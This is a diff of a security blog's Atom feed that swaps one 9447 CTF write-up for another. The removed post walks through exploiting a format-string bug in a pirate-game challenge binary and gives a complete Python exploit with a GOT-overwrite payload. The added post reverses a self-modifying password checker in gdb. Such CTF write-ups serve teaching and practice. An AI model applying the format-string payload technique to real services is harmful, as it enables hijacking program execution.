@@ -1,10 +1,10 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
 
-  <title><![CDATA[Category: Binary | staring into /dev/null]]></title>
+  <title><![CDATA[Category: Binary, | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/binary/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2014-12-01T21:09:11+01:00</updated>
+  <updated>2014-12-02T22:07:47+01:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -14,261 +14,161 @@
 
   
   <entry>
-    <title type="html"><![CDATA[9447 CTF: Booty]]></title>
-    <link href="http://barrebas.github.io/blog/2014/12/01/9447-ctf-booty/"/>
-    <updated>2014-12-01T20:13:31+01:00</updated>
-    <id>http://barrebas.github.io/blog/2014/12/01/9447-ctf-booty</id>
-    <content type="html"><![CDATA[<p>9447 CTF was ran the other day, and while I didn&rsquo;t have a lot of time, I managed to snatch a couple of flags. First one was this pirate-themed Binary Exploitation.</p>
+    <title type="html"><![CDATA[9447 CTF: Rolling]]></title>
+    <link href="http://barrebas.github.io/blog/2014/12/02/9447-ctf-rolling/"/>
+    <updated>2014-12-02T20:43:25+01:00</updated>
+    <id>http://barrebas.github.io/blog/2014/12/02/9447-ctf-rolling</id>
+    <content type="html"><![CDATA[<p>The last flag for 9447 CTF that I got was this binary reversing challenge. Let&rsquo;s get <code>rolling</code>!</p>
 
 <!--more-->
 
 
-<p>The binary present some kind of text-based arm-wrestling game. You can enter your name and then you have to fight several opponents. With no obvious buffer overflow / format string vulnerability (<code>%</code> characters are filtered and set to NULL) in sight, I focused on building a script that would win the game for me. After this, it was possible to change the name, and I was hoping a vulnerability would be present there.</p>
+<p>Identifying the binary with file showed that it was a 64-bit ELF, dynamically linked. Unfortunately for me, it was linked against a higher <code>libc</code> version:</p>
 
-<p>The game is quite easy to beat: the next move of the opponent can be predicted from the message the game sends you. So if the output contained &ldquo;is looking exhausted&rdquo;, the next move should be to &ldquo;[p]ush&rdquo;. I whipped up some quick python to do this and which gives command back to the user when it detects that the game is finished. The binary itself was ran with <code>socat</code>:</p>
-
-<pre><code class="bash">bas@tritonal:~/tmp/9447$ socat TCP-LISTEN:7778,fork EXEC:./booty
+<pre><code class="bash">bas@tritonal:~/tmp/9447$ ./rolling 
+./rolling: /lib/x86_64-linux-gnu/libc.so.6: version 'GLIBC_2.14' not found (required by ./rolling)
 </code></pre>
 
-<pre><code class="python">#!/usr/bin/python
+<p>To solve this issue, I needed a way to get the program to use a newer version of libc. One way to do this is using <code>LD_PRELOAD</code>. I downloaded a <a href="http://pkgs.org/ubuntu-14.10/ubuntu-main-amd64/libc6_2.19-10ubuntu2_amd64.deb.html">newer libc deb</a>, that ought to be binary compatible with my debian box. After unpacking <code>ld-2.19.so</code> and <code>libc-2.19.so</code>, I could start the binary like this:</p>
 
-from socket import *
-from time import sleep
-import telnetlib, struct
-
-s=socket(AF_INET, SOCK_STREAM)
-s.connect(('localhost', 7778))
-
-# wait before continuing, allows attaching with gdb.
-raw_input()
-
-# receive banner
-print s.recv(1024)
-sleep(0.01)
-
-# send name
-cmd ="barrebas"
-s.send(cmd+"\n")
-
-# try to beat the game
-while 1:
-    sleep(0.01)
-
-    data = s.recv(1024)
-
-    print data
-
-    # proper responses
-    if "LEVEL" in data:
-        cmd = "h\n"
-    if "exhausted" in data:
-        cmd = "p\n"
-    if "flex" in data:
-        cmd = "h\n"
-    if "tense" in data:
-        cmd = "r\n"
-
-    # we've won; hand over control
-    if "again" in data:
-        t = telnetlib.Telnet()
-        t.sock = s
-        t.interact()
-
-    # game expects input, so send it
-    if "&gt;" in data:
-        if cmd:
-            s.send(cmd)
-            cmd = ""
-s.close()
+<pre><code class="bash">bas@tritonal:~/tmp/9447$ LD_PRELOAD=./libc-2.19.so ./ld-2.19.so ./rolling
+Fynd i mewn i cyfrinair
 </code></pre>
 
-<p>This allows us to win the game and gives us a &ldquo;clue&rdquo; as to where the treasure (flag) is. Furthermore, we can enter a new user name, but again, no obvious vulnerabilities. et0x noticed that once you send a shorter username, part of the previous username shows up. This can be seen below, as the new user name is not <code>KING</code> but <code>KINGebas</code>:</p>
+<p>And in <code>gdb</code>:</p>
 
-<pre><code class="bash">:: YOU WIN :: YE NOT BE WALKING THE PLANK YET!
+<pre><code class="bash">gdb-peda$ set environment LD_PRELOAD=./libc-2.19.so ./ld-2.19.so
+gdb-peda$ r
+Fynd i mewn i cyfrinair
 
-                      .ed"""" """$$$$be.
-                    -"           ^""**$$$e.
-                  ."                   '$$$c
-                 /                      "4$$b
-                d  3                     $$$$
-                $  *                   .$$$$$$
-               .$  ^c           $$$$$e$$$$$$$$.
-               d$L  4.         4$$$$$$$$$$$$$$b
-               $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
-   e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$
-  z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
- 4$$$$L   \     $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
- ^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
-   "**$$$ec   "\   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
-         "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
-            ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
-              "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
-                "*$$$  *=%4.$ L L$ P3$$$F $$$P"
-                   "$   "%*ebJLzb$e$$$$$b $P"
-                     %..      4$$$$$$$$$$ "
-                      $$$e   z$$$$$$$$$$%
-                       "*$c  "$$$$$$$P"
-                        ."""*$$$$$$$$bc
-                     .-"    .$***$$$"""*e.
-                  .-"    .e$"     "*$c  ^*b.
-           .=*""""    .e$*"          "*bc  "*$e..
-         .$"        .z*"               ^*$e.   "*****e.
-         $$ee$c   .d"                     "*$.        3.
-         ^*$E")$..$"                         *   .ee==d%
-            $.d$$$*                           *  J$$$e*
-             """""                             "$$$"
-
-
-:: HAIL THE NEW PIRATE KING, barrebas
-
-0xffdd1c3f marks the spot of your treasure!
-
-Would ye like to play again? (y / n):
-&gt; 
-y   
-PIRATE KING's be entitled to change their name:
-&gt; &gt; KING
-
-STA:  62, STR: 10 :: KINGebas
-STA: 104, STR: 18 :: Vengeful Queen Anne
-
-Vengeful Queen Anne begins to flex their muscles.
-
-Choose an action, [p]ush  [h]old  [r]est:
+Program received signal SIGSEGV, Segmentation fault.
+&lt;snip&gt;
 </code></pre>
 
-<p>I focused on the binary address, but as it turned out, the flag is not being read into the binary! I tried to break on <code>fopen</code>, and search the memory from within <code>gdb</code> for the flag that I planted locally&hellip; but nothing! Inspecting that memory address in <code>gdb</code> showed:</p>
+<p>The program would still segfault, but at least it ran. Okay, let&rsquo;s get to work. The strange string meant nothing to me, but it&rsquo;s Welsh for &ldquo;Enter a password&rdquo;. Of course, the description on 9447 mentioned that the binary would take an input. The flag is the input which the binary accepts. I ran the binary with an argument, which resulted in another Welsh string. <code>strings</code> identified the last Welsh string. I looked up their meaning via Google Translate and their address in <code>gdb</code>:</p>
 
-<pre><code class="bash"># bas@tritonal:~/tmp/9447$ gdb -pid `pgrep booty`
+<pre><code class="bash">Nac oes. Ceisiwch eto. == No. Try again. // rolling : 0x600865 ("Nac oes. Ceisiwch eto.")
+Llongyfarchiadau == Congratulations // rolling : 0x600854 ("Llongyfarchiadau")
+</code></pre>
+
+<p>These strings look like the &ldquo;Good&rdquo;/&ldquo;Bad&rdquo; output that we expect for this input-checking binary! Switching over to the output of <code>objdump</code>, I looked up where these strings are referenced:</p>
+
+<pre><code class="bash">  400771:   48 8b 55 f0             mov    -0x10(%rbp),%rdx
+  400775:   48 83 c2 08             add    $0x8,%rdx
+  400779:   48 8b 12                mov    (%rdx),%rdx
+  40077c:   48 89 d7                mov    %rdx,%rdi
+  40077f:   ff d0                   callq  *%rax        # interesting function
+  400781:   85 c0                   test   %eax,%eax    # if eax == 1 -&gt; success
+  400783:   74 0c                   je     400791 &lt;memcpy@plt+0x2b1&gt;
+  400785:   bf 54 08 40 00          mov    $0x400854,%edi               # Llong...
+  40078a:   e8 11 fd ff ff          callq  4004a0 &lt;puts@plt&gt;
+  40078f:   eb 16                   jmp    4007a7 &lt;memcpy@plt+0x2c7&gt;
+  400791:   bf 65 08 40 00          mov    $0x400865,%edi               # Nac oes... 
+  400796:   e8 05 fd ff ff          callq  4004a0 &lt;puts@plt&gt;
+  40079b:   eb 0a                   jmp    4007a7 &lt;memcpy@plt+0x2c7&gt;
+  40079d:   bf 7c 08 40 00          mov    $0x40087c,%edi
+  4007a2:   e8 f9 fc ff ff          callq  4004a0 &lt;puts@plt&gt;
+  4007a7:   b8 00 00 00 00          mov    $0x0,%eax
+  4007ac:   c9                      leaveq 
+  4007ad:   c3                      retq  
+</code></pre>
+
+<p>The <code>test eax, eax</code> at <code>0x400781</code> controls which path is taken: either OK (&ldquo;Llong&hellip;&rdquo;) or not OK (&ldquo;Nac oes&hellip;&rdquo;). The value of <code>eax</code> is probably set by the function that is called at <code>0x40077f: callq  *%rax</code>. Switching back to <code>gdb</code>, I set a breakpoint on <code>0x40077f</code> and prepared to trace that function.</p>
+
+<pre><code class="bash">gdb-peda$ b *0x40077f
+Breakpoint 1 at 0x40077f
+gdb-peda$ r bleh
 ...
-Stopped reason: SIGINT
-0xf7757430 in __kernel_vsyscall ()
-gdb-peda$ x/10x 0xffdd1c3f
-0xffdd1c3f: 0xdd1c9000  0x000001ff  0xdd1cd800  0x048e51ff
-0xffdd1c4f: 0xdd1c9008  0x000001ff  0xdd1d4800  0x048796ff
-0xffdd1c5f: 0x73d4e008  0x0499def7
+[-------------------------------------code-------------------------------------]
+   0x400775:    add    rdx,0x8
+   0x400779:    mov    rdx,QWORD PTR [rdx]
+   0x40077c:    mov    rdi,rdx
+=&gt; 0x40077f:    call   rax
+   0x400781:    test   eax,eax
+   0x400783:    je     0x400791
+...
+Breakpoint 1, 0x000000000040077f in ?? ()
 </code></pre>
 
-<p>Nothing there! No string, no flag, nothing! To be honest, I spent quite some time trying to figure out what I was doing wrong. I figured I was to blame and tried to read the address  that is returned after winning on the remote server. I hope the flag would be there. For this, I needed et0x&rsquo;s observation, because it allowed me to bypass the filtering of <code>%</code> characters. The binary filters the characters here:</p>
+<p>The binary was halted at the <code>call eax</code> instruction. I entered <code>ni</code> to step into the function. This is where the fun really starts, it is where our string is checked for validity. There&rsquo;s a red herring in there too. The function starts like this:</p>
 
-<pre><code> 80488dd:   80 7a ff 25             cmpb   $0x25,-0x1(%edx)
- 80488e1:   74 0d                   je     80488f0 &lt;vfprintf@plt+0x380&gt;
- 80488e3:   39 c2                   cmp    %eax,%edx
- 80488e5:   75 f1                   jne    80488d8 &lt;vfprintf@plt+0x36
+<pre><code>gdb-peda$ x/40i $rip
+=&gt; 0x7ffff7ff5000:  push   rbp
+   0x7ffff7ff5001:  mov    rbp,rsp
+   0x7ffff7ff5004:  sub    rsp,0x10
+   0x7ffff7ff5008:  mov    QWORD PTR [rbp-0x8],rdi
+   0x7ffff7ff500c:  mov    rax,QWORD PTR [rbp-0x8]
+   # grab first byte of input
+   0x7ffff7ff5010:  movzx  eax,BYTE PTR [rax]   
+   # is it '9'?
+   0x7ffff7ff5013:  cmp    al,0x39
+   # if so, jump away
+   0x7ffff7ff5015:  je     0x7ffff7ff5143   
+   # else:
+   0x7ffff7ff501b:  mov    rax,QWORD PTR [rbp-0x8] 
+   # grab first byte of input
+   0x7ffff7ff501f:  movzx  eax,BYTE PTR [rax]   
+   # is it 'f'?
+   0x7ffff7ff5022:  cmp    al,0x66          
+   # if not, jump away
+   0x7ffff7ff5024:  jne    0x7ffff7ff5139   
+   0x7ffff7ff502a:  mov    rax,QWORD PTR [rbp-0x8]
+   # second byte of input
+   0x7ffff7ff502e:  add    rax,0x1      
+   0x7ffff7ff5032:  movzx  eax,BYTE PTR [rax]
+   # is it 'l'?
+   0x7ffff7ff5035:  cmp    al,0x6c  
+   0x7ffff7ff5037:  jne    0x7ffff7ff5139
+   0x7ffff7ff503d:  mov    rax,QWORD PTR [rbp-0x8]
+   # third byte of input
+   0x7ffff7ff5041:  add    rax,0x2
+   0x7ffff7ff5045:  movzx  eax,BYTE PTR [rax]
+   # is it 'a'?
+   0x7ffff7ff5048:  cmp    al,0x61
 </code></pre>
 
-<p>If it encounters a <code>%</code>, it will stop and set that byte to NULL. However, if we supply a new username that is shorter than the previous one, the program will only check len(username) bytes for <code>%</code> characters. If we supply:</p>
+<p>I was all super excited and started to trace the path that started spelling out <code>flag</code>, each time adjusting <code>al</code> to the value that it was being compared to (in <code>gdb</code>, this can be done by executing <code>set $al=0x66</code>). However, this path spelled out <code>flagstartswith9</code>. In other words, I fell for the red herring. D&#8217;oh! The other code path started comparing the input to <code>9</code>, so I restarted the binary and entered <code>9447</code> as the input. Re-tracing the check-input function, I noticed that the code had changed!</p>
 
-<pre><code>%aa%x%x
+<pre><code># Input 'bleh':
+   0x7ffff7ff5022:  cmp    al,0x66  
+# Input '9447'
+   0x7ffff7ff5022:  cmp    al,0x34
 </code></pre>
 
-<p>as the first user name and then</p>
+<p>Very fancy. I traced the function further, ending up here:</p>
 
-<pre><code>bb
+<pre><code>gdb-peda$ 
+[----------------------------------registers-----------------------------------]
+RAX: 0x72 ('r')
+...
+[-------------------------------------code-------------------------------------]
+   0x7ffff7ff5062:  movzx  eax,BYTE PTR [rax]
+   0x7ffff7ff5065:  movsx  eax,al
+   0x7ffff7ff5068:  add    eax,0x39
+=&gt; 0x7ffff7ff506b:  cmp    edx,eax
 </code></pre>
 
-<p>Then the new username will be <code>bba%x%x</code>. All we have to do then is to beat the game once more, so the format string is triggered. That is because the string <code>:: HAIL THE NEW PIRATE KING,</code> is printed separately from the username, which is printed with something like <code>print(username)</code>.</p>
+<p>This is the fifth character of the password and seems to be <code>r</code>. I did a quick <code>set $edx=$eax</code> and moved on. The next bytes were <code>oll</code>, so I expected the following check to be for <code>i</code>. However, the password function borked, because it was using the first four characters to generate the next four! I had only entered four in total. The name of the binary, <code>rolling</code>, makes a bit more sense now :)</p>
 
-<p>I did all this to print the string at the memory address that is given by the binary&hellip; to no avail. The final piece of the puzzle was the <code>fopen</code> call that opens the file <code>/home/booty/flag</code>:</p>
-
-<pre><code class="bash"> 80487c0:   53                      push   %ebx
- 80487c1:   83 ec 10                sub    $0x10,%esp
- 80487c4:   68 60 9a 04 08          push   $0x8049a60   # 'r'
- 80487c9:   68 61 98 04 08          push   $0x8049861   # "/home/booty/flag"
- 80487ce:   e8 6d fd ff ff          call   8048540 &lt;fopen@plt&gt;
- 80487d3:   83 c4 10                add    $0x10,%esp
- 80487d6:   85 c0                   test   %eax,%eax
- 80487d8:   89 c3                   mov    %eax,%ebx
- 80487da:   75 19                   jne    80487f5 &lt;vfprintf@plt+0x285&gt;
- 80487dc:   eb 33                   jmp    8048811 &lt;vfprintf@plt+0x2a1&gt;
- 80487de:   66 90                   xchg   %ax,%ax
- 80487e0:   83 ec 08                sub    $0x8,%esp
- 80487e3:   0f be d0                movsbl %al,%edx
- 80487e6:   ff 35 a4 a1 04 08       pushl  0x804a1a4
- 80487ec:   52                      push   %edx
- 80487ed:   e8 fe fc ff ff          call   80484f0 &lt;_IO_putc@plt&gt;
- 80487f2:   83 c4 10                add    $0x10,%esp
- 80487f5:   83 ec 0c                sub    $0xc,%esp
- 80487f8:   53                      push   %ebx
- 80487f9:   e8 e2 fc ff ff          call   80484e0 &lt;_IO_getc@plt&gt;
- 80487fe:   83 c4 10                add    $0x10,%esp
- 8048801:   3c ff                   cmp    $0xff,%al
- 8048803:   75 db                   jne    80487e0 &lt;vfprintf@plt+0x270&gt;
- 8048805:   83 ec 0c                sub    $0xc,%esp
- 8048808:   53                      push   %ebx
- 8048809:   e8 b2 fc ff ff          call   80484c0 &lt;fclose@plt&gt;
- 804880e:   83 c4 10                add    $0x10,%esp
- 8048811:   83 ec 0c                sub    $0xc,%esp
- 8048814:   6a 00                   push   $0x0
- 8048816:   e8 f5 fc ff ff          call   8048510 &lt;exit@plt&gt;
+<pre><code># grab eight input byte
+   0x7ffff7ff50c1:  mov    rax,QWORD PTR [rbp-0x8]
+   0x7ffff7ff50c5:  add    rax,0x7
+   0x7ffff7ff50c9:  movzx  eax,BYTE PTR [rax]
+=&gt; 0x7ffff7ff50cc:  movsx  eax,al
+# grab third input byte...
+   0x7ffff7ff50cf:  mov    rdx,QWORD PTR [rbp-0x8]
+   0x7ffff7ff50d3:  add    rdx,0x3
+   0x7ffff7ff50d7:  movzx  edx,BYTE PTR [rdx]
+   0x7ffff7ff50da:  movsx  edx,dl
+# ... and add 0x35 to that third byte!
+   0x7ffff7ff50dd:  add    edx,0x35
+# compare [3]+0x35 to [7]:
+   0x7ffff7ff50e0:  cmp    eax,edx
 </code></pre>
 
-<p>It seems like this function is never called, yet it does open the flag and spits out the contents. I verified this from within <code>gdb</code> by running <code>set $eip=0x80487c0</code> and then continuing execution. Indeed, it spat out the bogus flag of my local system. I leveraged the string format vulnerability to overwrite a got pointer force the binary to execute that function. I chose to overwrite <code>vfprintf</code>, because that&rsquo;s called a lot by the binary. I needed to overwrite this pointer in two steps. First, the lower two bytes are overwritten with <code>0x87c0</code>. Then the higher two bytes are overwritten with <code>0x0804</code>. When the binary then wants to call <code>vfprintf</code>, code execution is redirected to <code>0x80487c0</code>!</p>
+<p>This meant I just had to re-run the binary once I had four more characters. No problem! Eventually, at each <code>cmp</code> execution, I noted the proper byte and the correct input turned out to be <code>9447rollingisfun</code>.</p>
 
-<p>The exploit now sends the first username: <code>cmd ="%AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%34719c%36$hn%32836c%37$n"</code>. This contains the <code>%</code> character and the rest of the format string. I found the proper offset for the direct addressing (<code>%36$hn</code>) simply by trying a few values together with a name that contained &ldquo;AAAABBBBCCCC&rdquo; blocks. The rest of the padding (<code>%34719c</code> for instance) is simply by running <code>gdb</code> and taking note of the address where the binary crashes. Adding the right amount of padding, observing the crash again, etc.</p>
-
-<p>The final exploit:</p>
-
-<pre><code class="python">#!/usr/bin/python
-
-from socket import *
-from time import sleep
-import telnetlib, struct
-
-s=socket(AF_INET, SOCK_STREAM)
-s.connect(('localhost', 7778))
-
-# wait before continuing, allows attaching with gdb.
-raw_input()
-
-# receive banner
-print s.recv(1024)
-sleep(0.01)
-
-# send string format name
-cmd ="%AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%34719c%36$hn%32836c%37$n"
-
-s.send(cmd+"\n")
-
-# try to beat the game
-while 1:
-    sleep(0.01)
-
-    data = s.recv(1024)
-
-    print data
-
-    # proper responses
-    if "LEVEL" in data:
-        cmd = "h\n"
-    if "exhausted" in data:
-        cmd = "p\n"
-    if "flex" in data:
-        cmd = "h\n"
-    if "tense" in data:
-        cmd = "r\n"
-
-    # we've won; update name to activate string format bug
-    if "again" in data:
-        # 0x804a138: vfprintf@got.plt
-        # we overwrite it in two parts, the first uses %hn to write two bytes to the lower part of the address
-        # the second %n overwrites four bytes, but I don't really care.
-        # the rest of the string format bug is: "%34719c%36$hn%32836c%37$n"
-        cmd = "ya0AAAAAAAAAAAAAAAAAAAAAAA" + struct.pack("&lt;L", 0x804a138) + struct.pack("&lt;L", 0x804a13a) + "\n"
-
-    # flag is in the input, so halt execution &amp; take note of it!
-    if "9447" in data:
-        raw_input()
-
-    # game expects input, so send it
-    if "&gt;" in data:
-        if cmd:
-            s.send(cmd)
-            cmd = ""
-s.close()
-</code></pre>
-
-<p>The real flag was something like <code>9447{YOHOHO_A_PIRATES_LIFE_FOR_ME}</code>.</p>
+<p>The flag was <code>9447{9447rollingisfun}</code>.</p>
 ]]></content>
   </entry>
   
